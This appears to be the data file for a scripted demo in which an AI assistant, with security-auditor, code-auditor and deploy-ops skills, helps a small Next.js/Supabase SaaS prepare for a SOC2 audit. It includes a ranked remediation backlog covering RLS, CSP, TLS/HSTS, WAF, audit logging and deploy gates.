| **C (CC6)** | Common-Criteria finding; auditor will flag on first review | This + next sprint |
| **D (defence-in-depth)** | Not a SOC2 fail; nice to have | Next sprint or backlog |
| **H (hygiene)** | Not exploitable; documentation/process | Ongoing |

## 2. SOC2 blockers (must fix before auditor arrives)

### B-1 — Supabase: switch to per-tenant JWT for RLS

- **Finding:** service-role key used for tenant-scoped queries; RLS is a suggestion, not a control.
- **Why critical:** a single \`where team_id=session.teamId\` typo would leak across tenants.
- **Fix:**
  1. Generate a short-lived JWT per-request with \`tenant_id\` as a claim.
  2. Swap \`createClient\` to use \`getSupabase(userJwt)\` in every API route.
  3. Enable RLS on every tenant-scoped table; write policies that filter on the JWT claim.
- **Scope:** 23 API routes + \`lib/supabase/server.ts\` + 14 RLS policies.
- **Acceptance criteria:**
  - [ ] Every API route reads tenant data via \`getSupabase(userJwt)\` (not the service-role client).
  - [ ] RLS enabled on all 14 tenant-scoped tables; each has a \`tenant_isolation\` policy that filters on the JWT claim.
  - [ ] Integration test \`tests/security/cross-tenant.spec.ts\` asserts that a request authenticated as tenant A returns 0 rows for tenant B's data on every tenant-scoped endpoint.
  - [ ] \`bin/audit/rls-coverage.sh\` reports 100% on every tenant table.
  - [ ] Lint rule \`no-service-role-in-request\` is GREEN (no grandfathered \`eslint-disable\` left).
- **Regression test:** \`tests/security/cross-tenant.spec.ts\` (above); CI also runs \`bin/audit/rls-coverage.sh\` on every PR.
- **Rollback:** revert the JWT-issuance commit; the service-role path is still in git history and would work, but rolling back puts the SOC2 blocker back in place. Prefer fix-forward.
- **Verification artifact:** PR + lint-rule snapshot + \`rls-coverage.sh\` output committed to \`docs/security/evidence/b-1-rls-coverage.txt\`.
- **Verification:** code-auditor confirmed 23 call-sites; added a lint rule (\`no-service-role-in-request\`) that fails CI on regression.
- **Est:** 1–2 days.
- **Owner:** founder (handle directly given criticality).
- **Done when:** \`bin/audit/rls-coverage.sh\` reports 100% of tenant tables protected; lint rule green; integration test confirms cross-tenant query is rejected.

### B-2 — Content-Security-Policy (report-only first, then enforce)

- **Finding:** no CSP; any XSS has full page reign.
- **Fix:**
  1. Add CSP via \`middleware.ts\`, nonce-per-request.
  2. Start in \`Content-Security-Policy-Report-Only\` mode.
  3. Collect reports at \`POST /csp-report\` for 7 days.
  4. After 7 days of zero unexplained violations, drop \`-Report-Only\`.
- **Scope:** \`middleware.ts\`, \`app/csp-report/route.ts\`, \`app/layout.tsx\` (nonce plumbing).
- **Acceptance criteria:**
  - [ ] \`middleware.ts\` emits \`Content-Security-Policy-Report-Only\` header on every response.
  - [ ] Per-request nonce inherited by every \`<script>\` and \`<style>\` tag rendered through the app.
  - [ ] \`/csp-report\` endpoint accepts violations and forwards to Sentry.
  - [ ] After 7-day soak with zero unexplained violations: flip to \`Content-Security-Policy\` (enforce).
  - [ ] Re-run \`/secaudit\` → Finding #2 status flips to GREEN.
- **Regression test:** \`tests/security/csp.spec.ts\` — 3 tests covering nonce presence, inline-script block, report endpoint shape.
- **Rollback:** flip \`CSP_ENFORCE=false\` env var; redeploy. < 5 min. Reverts to report-only. Reverting the middleware itself is < 10 min via PR revert; either rollback path is safe.
- **Verification artifact:** Sentry tag \`csp_violation\` count over the 7-day soak window; expected 0 unexplained.
- **Verification:** security-auditor re-scan after enforcement day; \`/csp-report\` log shows zero unexplained violations.
- **Est:** 1 day initial + 7-day soak + 1 day enforcement.
- **Done when:** header is \`Content-Security-Policy\` (not \`-Report-Only\`); /secaudit re-scan flips Finding #2 to GREEN.

### B-3 — Strip stack traces from production 500s

- **Finding:** error pages render stack traces containing source paths. Disclosure.
- **Fix:** replace \`global-error.tsx\` with a clean page; only the server log has the trace.
- **Scope:** one file.
- **Acceptance criteria:**
  - [ ] \`app/global-error.tsx\` renders \`error.digest\` only; no \`error.stack\` reference.
  - [ ] Production 500 response body contains no \`/var/task\` or \`webpack://\` substrings.
  - [ ] Server log retains the full trace, searchable by digest.
- **Regression test:** \`tests/security/no-stack-trace-in-500.spec.ts\` — fires a synthetic 500, asserts response body matches the clean template.
- **Rollback:** revert PR; redeploy. < 10 min. No user impact.
- **Verification artifact:** PR review + \`curl -fsS https://app.example.com/__force_500__ | wc -c\` returns < 1KB.
- **Est:** 2 hours.

## 3. CC6 findings (should fix before audit)

### C-1 — Cloudflare WAF: enable managed rulesets + rate-limit /api/*

- **Fix:**
  - Enable CF Managed Ruleset + OWASP Core Rule Set.
  - Add rate-limit (60 anon, 600 auth) on \`/api/*\`.
  - Bot Fight Mode on \`/signup\`, \`/login\`, \`/api/auth/*\`.
- **Acceptance criteria:**
  - [ ] CF dashboard shows both Managed and OWASP rulesets enabled in Block mode.
  - [ ] Rate-limit rules configured: 60/min anon, 600/min auth, with Challenge action.
  - [ ] Bot Fight Mode active for auth paths.
  - [ ] Synthetic credential-stuffing probe gets challenged within 5 requests.
- **Regression test:** \`scripts/security/synthetic-bot-probe.sh\` runs nightly; alert if BFM stops firing.
- **Rollback:** disable rulesets in dashboard. < 1 min. User-visible: noisier traffic but no breakage.
- **Verification artifact:** screenshot of CF dashboard committed to \`docs/security/evidence/c-1-cf-dashboard.png\`.
- **Scope:** Cloudflare dashboard, no code.
- **Est:** 30 minutes.

### C-2 — SSL mode → Full (strict); Min TLS → 1.2; HSTS on

- **Fix:**
  - Cloudflare SSL Mode: Full → Full (strict).
  - Min TLS Version: 1.0 → 1.2.
  - HSTS: \`max-age=63072000; includeSubDomains; preload\`.
- **Acceptance criteria:**
  - [ ] \`curl -fsSI https://app.example.com\` shows \`strict-transport-security: max-age=63072000; includeSubDomains; preload\`.
  - [ ] \`openssl s_client -tls1_1 -connect app.example.com:443 < /dev/null\` is refused.
  - [ ] CF SSL/TLS Overview shows mode "Full (strict)" with a valid origin cert chain.
- **Regression test:** \`tests/security/tls-config.spec.ts\` polls every prod deploy and asserts headers match expectation; alerts on drift.
- **Rollback:** CF dashboard toggles for SSL mode + Min TLS are reversible in < 1 min. **HSTS cannot be rolled back within the cache window** (recommendation: ship with \`max-age=300\` for 24h before bumping to 2y; gives a recovery window if anything breaks).
- **Verification artifact:** \`curl -I\` output saved to \`docs/security/evidence/c-2-headers.txt\`; \`hstspreload.org\` test pass.
- **Scope:** Cloudflare dashboard.
- **Est:** 15 minutes (no app code change; origin already presents a valid cert).
- **Note:** HSTS preload submission is a separate decision (see hardening plan §2.1).

### C-3 — Admin audit log

- **Fix:** new \`admin_audit_log\` table + \`logAdminAction()\` wrapper at every admin route entry point. 7-year retention policy.
- **Acceptance criteria:**
  - [ ] Migration creates the table (partitioned by month via pg_partman).
  - [ ] All 6 admin routes wrap their action in \`logAdminAction\`.
  - [ ] Retention cron drops partitions > 7y old; daily metric exported.
  - [ ] Trigger one admin action in staging; row appears in table within 1s with before/after snapshots.
- **Regression test:** \`tests/admin/audit-log-coverage.spec.ts\` — asserts every \`/admin/*\` route emits an audit row.
- **Rollback:** revert PR; table retains existing rows (read-only). < 10 min. No user impact.
- **Verification artifact:** sample row from staging committed to \`docs/security/evidence/c-3-sample-event.json\`.
- **Scope:** one migration, one wrapper function, 6 admin routes.
- **Est:** 1 day.

## 4. Defence-in-depth

### D-1 — SameSite=Strict on session cookie + \`__Host-\` prefix

- **Fix:** rename cookie to \`__Host-session\`, set \`SameSite=Strict\`. Special-case OAuth callback path with one-shot \`Lax\` cookie that promotes to \`Strict\`.
- **Est:** 1 hour; regression-test login flows.

### D-2 — Stripe webhook IP allow-list

- **Fix:** in addition to HMAC, verify \`X-Forwarded-For\` against Stripe's published CIDR block.
- **Est:** 2 hours. (Note: already addressed in the Stripe integration audit; this is the same fix from a different lens.)

### D-3 — CAA DNS records

- **Fix:** add CAA records restricting certificate issuance to Let's Encrypt + Cloudflare only.
- **Est:** 10 minutes.

### D-4 — Email obfuscation + hotlink protection

- **Fix:** Cloudflare dashboard toggles. Reduces scraper signal + cross-site image abuse.
- **Est:** 5 minutes.

## 5. Hygiene

### H-1 — Documented threat model on file

- **Fix:** commit the threat-model artifact to \`docs/security/threat-model.md\`. Review quarterly.
- **Est:** 10 minutes (the doc already exists; just commit it).

### H-2 — Subprocessor inventory + DPA on file

- **Fix:** list every subprocessor (Cloudflare, Vercel, Supabase, Stripe, Sentry); confirm DPAs are signed; commit to \`docs/security/subprocessors.md\`.
- **Est:** 30 minutes (most are signed; just consolidate).

### H-3 — Quarterly security review cadence

- **Fix:** add a recurring calendar entry for \`/secaudit\` re-run every 90 days.
- **Est:** 5 minutes.

## 6. Sprint proposal

\`\`\`
Sprint A (this week)       B-1, B-2 (report-only), B-3, C-1, C-2     ~3 days work
Sprint B (next week)       B-2 (enforce), C-3, D-1, D-2, D-3, D-4    ~2 days work
Hygiene (ongoing)          H-1, H-2, H-3 (mostly docs)               ~1 hour
Re-audit                   /secaudit after each sprint               separate cadence
Pen-test                   external; book after Sprint B closes      separate engagement
\`\`\`

Both sprints pass through app-architect's normal build → code-auditor → security-auditor → deploy-ops chain. No one-off patches direct to prod.

## 7. Tracking

Linear project: \`security-soc2-prep\`. Each backlog item maps to a Linear issue with the same id (B-1, B-2, etc.). Closing an issue requires an attached PR + the security-auditor re-scan output as a comment.

## 8. Communication

| Audience | Cadence | What |
|---|---|---|
| Founder | daily during Sprint A/B | Slack DM with what shipped + what's next |
| Investors | end of Sprint A | "We're SOC2-ready" milestone email |
| Customers | only on incident | (no proactive comms during prep) |
| Auditor | week before audit | full scope packet (this doc + attestation) |

## 9. Definition of "audit-ready"

All B-tier and C-tier items closed; D-tier items either closed or with a documented "accepted risk" decision; H-tier items committed to the repo. Pen-test booked. Subprocessor DPAs filed.

Estimated calendar time from this doc to "audit-ready": **~2.5 weeks** of focused work + 7-day CSP soak.

## 10. Auditor pre-meeting packet

Day-1 hand-off to the auditor:

| Document | Path / URL | Purpose |
|---|---|---|
| Threat model | \`docs/security/threat-model.md\` (this artifact) | CC3 / A04 evidence |
| Hardening plan | \`docs/security/hardening-plan.md\` (artifact 2) | CC6 / A05 evidence |
| Remediation backlog | this document | CC9 evidence |
| Subprocessor inventory + DPAs | \`docs/security/subprocessors.md\` | CC9.2 |
| Deploy + rollback runbook | \`docs/runbooks/deploy.md\` | CC7 |
| Incident response runbook | \`docs/runbooks/incident-response.md\` + last drill | CC7.4 |
| 7-day CSP report log | Sentry export | Finding #2 closure evidence |
| 28-day audit-log sample | \`admin_audit_log\` export | Finding #7 closure evidence |
| RLS coverage report | \`docs/security/evidence/b-1-rls-coverage.txt\` | Finding #1 closure evidence |
| Cloudflare config screenshots | \`docs/security/evidence/c-1-cf-dashboard.png\`, \`c-2-headers.txt\` | C-1, C-2 closure |
| Privacy policy | public \`/privacy\` page | CC2 |

## 11. Communication templates

### Daily Slack DM (founder ↔ self, during sprint)

\`\`\`
Sprint A — Day {n} of 5
Shipped today:
  - {item id}: {one-line outcome}
Blocked on:
  - {item id}: {reason}; {what unblocks it}
Tomorrow:
  - {next 1-2 items}
\`\`\`

### Weekly investor email (end of Sprint A and B)

\`\`\`
Subject: SOC2 prep update — {week N}

This week we closed {n} of the SOC2 blocker items:
- {B-1 / B-2 / B-3 + status emoji each}

Audit-ready definition (§9): {x of y items} closed.
Pen-test: {scheduled / booked / completed}.
Auditor scheduled: {date}.

Risks tracking: {1-2 sentences}.
\`\`\`

Checkpoint: \`.checkpoints/security-auditor.checkpoint.json\`.`,
    },
  ],
  skills: ["security-auditor", "code-auditor", "deploy-ops"],
  runtime: "≈ 11 exchanges",
  steps: [
    { type: "beat", label: "01 · Threat model", caption: "security-auditor runs STRIDE + OWASP", skills: ["security-auditor"] },

    {
      type: "exchange", role: "user",
      content:
`First SOC2 audit in six weeks. We're a Next.js SaaS on Cloudflare + Supabase, 80 paying customers. I read the OWASP Top 10 once. Nobody here is a security specialist.

What's going to fail when the auditor looks?`
    },
    {
      type: "exchange", role: "claude", skill: "security-auditor",
      content:
`Invoking **security-auditor** in \`/secaudit\` mode. Four-stage sweep:

1. **Threat model** — STRIDE per trust boundary, OWASP mapping.
2. **Attack-surface map** — every externally-reachable endpoint + what it trusts.
3. **Hardening pass** — CSP, TLS, DNS, WAF, rate-limiting, error handling.
4. **Remediation backlog** — ranked by SOC2 impact × exploitability.

Note: I operate **above** code-auditor — I'm asking "what's the threat model?" and "is the infra hardened?", not "does this function have a bug?". I'll chain to code-auditor once I have findings that need a code-level sweep underneath.

Give me: repo root, \`wrangler.toml\` / \`next.config.js\` / \`middleware.ts\`, your Supabase project settings (service-role vs. anon usage), and one example API route that reads tenant-scoped data. Starting the threat model in parallel.`
    },
    {
      type: "exchange", role: "user",
      content:
`Repo is clean Next 15 + middleware.ts. Supabase: we pretty much always use the service-role key server-side "because RLS is a pain". One example route is /api/tasks — reads \`tasks\` where \`team_id = session.teamId\`.

middleware.ts just handles auth redirects right now. No CSP set anywhere. Cloudflare is on default settings.`
    },
    {
      type: "exchange", role: "claude", skill: "security-auditor",
      content:
`That phrase — "we always use the service-role key because RLS is a pain" — is the audit killer. If the service role is used for tenant-scoped queries, **RLS is effectively disabled for those queries**; the \`where team_id = session.teamId\` is a bug-class away from cross-tenant data disclosure.

Running STRIDE per boundary. Top findings:

1. **CRITICAL — Tampering.** Supabase service-role key used for tenant-scoped queries. Fix: swap to per-tenant JWT with \`team_id\` claim, let RLS enforce.
2. **HIGH — Info disclosure.** No CSP. Any XSS gets full page reign.
3. **HIGH — DoS.** Cloudflare on default ruleset; \`/api/*\` has no rate-limit.
4. **HIGH — Info disclosure.** Production 500s render stack traces with source paths.
5. **MEDIUM — Spoofing.** Session cookie is \`SameSite=Lax\` — CSRF on state-changing GET.
6. **MEDIUM — Elevation of privilege.** Admin role checked at route level, not row level.
7. **MEDIUM — Repudiation.** No audit log for admin actions.
8. **LOW — Tampering.** Stripe webhook verifies HMAC but not IP origin (defence-in-depth gap).

OWASP map: A01 (Broken Access Control) FAIL, A05 (Security Misconfiguration) FAIL, A04 / A09 PARTIAL. The rest PASS.

Findings 1 + 2 are **hard SOC2 blockers** — the auditor will flag them in ten minutes. I'm chaining to **code-auditor** now to confirm Finding #1's exploit path — is the RLS bypass actually triggered from any route, not just theoretically?

Writing \`.checkpoints/security-auditor.checkpoint.json\`.`,
      artifacts: ["threat-model"],
    },

    { type: "beat", label: "02 · Code-level chain", caption: "code-auditor sweeps underneath", skills: ["code-auditor"] },

    {
      type: "exchange", role: "claude", skill: "code-auditor",
      content:
`Invoked by security-auditor for the code-level sweep underneath Finding #1. Running \`/audit security\` with a narrow scope: every call-site of the Supabase client.

\`\`\`
 files scanned       147 (TS/TSX)
 supabase imports    23 distinct call-sites
 service-role uses   23 / 23  ← all of them
 anon / user-jwt uses 0 / 23
 rls-aware           0 / 23
\`\`\`

Every single tenant-scoped query runs with the service role. The \`where team_id = session.teamId\` filter is the only defence against cross-tenant reads. A missing \`where\` clause, a wrong column reference, or an injection that slips past Zod validation would leak across tenants.

**Lint rule added** to \`.eslintrc.json\`:
\`\`\`
"no-service-role-in-request": "error"
\`\`\`
CI will fail on any new service-role use from a request handler. The 23 existing call-sites are grandfathered via \`// eslint-disable-next-line\` comments with \`TODO(security-auditor): B-1\` — so they remain visible until remediation lands.

Chaining back to security-auditor to fold this into the remediation backlog.`
    },

    { type: "beat", label: "03 · Hardening plan", caption: "security-auditor writes the infra playbook", skills: ["security-auditor"] },

    {
      type: "exchange", role: "claude", skill: "security-auditor",
      content:
`Phase 3 — **Hardening pass.** Infra-level fixes that don't require code changes (or require minimal ones).

**Content-Security-Policy.** Ship a strict CSP with per-request nonce, in \`Report-Only\` mode for 7 days before enforcing. Catches false positives before they break customer flows.

**TLS.**
- Cloudflare SSL → Full (**strict**) — currently "Full", which accepts self-signed origin.
- Min TLS version → 1.2 (was 1.0).
- HSTS \`max-age=63072000; includeSubDomains; preload\`.
- CAA DNS records restricting cert issuance to Let's Encrypt + Cloudflare.

**WAF + rate-limit.**
- Enable CF Managed Ruleset + OWASP Core Rule Set (currently "basic").
- Rate-limit \`/api/*\`: 60 req/min/IP anon, 600 req/min/IP auth. Response is **Challenge page**, not block — avoids false positives on corporate NAT.
- Bot Fight Mode on \`/signup\`, \`/login\`, \`/api/auth/*\`.

**Error handling.** \`global-error.tsx\` renders a correlation id; the full trace only lives in the log aggregator.

**Cookie hardening.** \`SameSite=Strict\` + \`__Host-\` prefix on the session cookie.

**Admin audit log.** New \`admin_audit_log\` table, 7-year retention (SOC2 CC7.2).

Writing the hardening plan.`,
      artifacts: ["hardening-plan"],
    },

    { type: "beat", label: "04 · Remediation backlog + deploy gate", caption: "security-auditor hands off to the build pipeline", skills: ["security-auditor", "deploy-ops"] },

    {
      type: "exchange", role: "user",
      content: "OK. How do I know the next deploy actually cleared all this?"
    },
    {
      type: "exchange", role: "claude", skill: "security-auditor",
      content:
`I update the **deploy-ops** gate to require a passing security-auditor check before any prod deploy. From now on, \`/deploy prod\` runs:

1. \`code-auditor /audit pre-deploy\` — code-level findings.
2. \`security-auditor /sec verify\` — re-scans the top-8 STRIDE findings; any still RED blocks the deploy.
3. \`deploy-ops\` gate proceeds only when both pass.

Remediation backlog is ranked for a two-sprint burn:

**Sprint A (this week):** B-1 (RLS fix), B-2 (CSP report-only), B-3 (stack-trace strip), C-1 (WAF), C-2 (TLS / HSTS).
**Sprint B (next week):** B-2 enforce, C-3 (admin audit log), D-1 (SameSite=Strict), D-2 (Stripe IP), D-3 (CAA).

Each goes through the normal app-architect build loop — code-auditor + security-auditor + deploy-ops chain on every sprint. No one-off patches.

Re-run \`/secaudit\` after Sprint A; I'll re-score and show you what moved.`,
      artifacts: ["remediation-backlog"],
    },
    {
      type: "exchange", role: "claude", skill: "deploy-ops",
      content:
`Noted. \`deploy-ops\` pre-flight updated:

\`\`\`
 gate checks (prod deploy)
   ✓ code-auditor:      grade ≥ B (required)
   ✓ security-auditor:  no OPEN findings of severity HIGH or CRITICAL
   ✓ tests:             full suite green
   ✓ type-check:        clean
\`\`\`

The current deploy would fail the security gate — B-1 and B-2 are OPEN CRITICAL/HIGH. Next green deploy is after Sprint A.

Checkpoint: \`.checkpoints/deploy-ops.checkpoint.json\`.`
    },
  ],
};
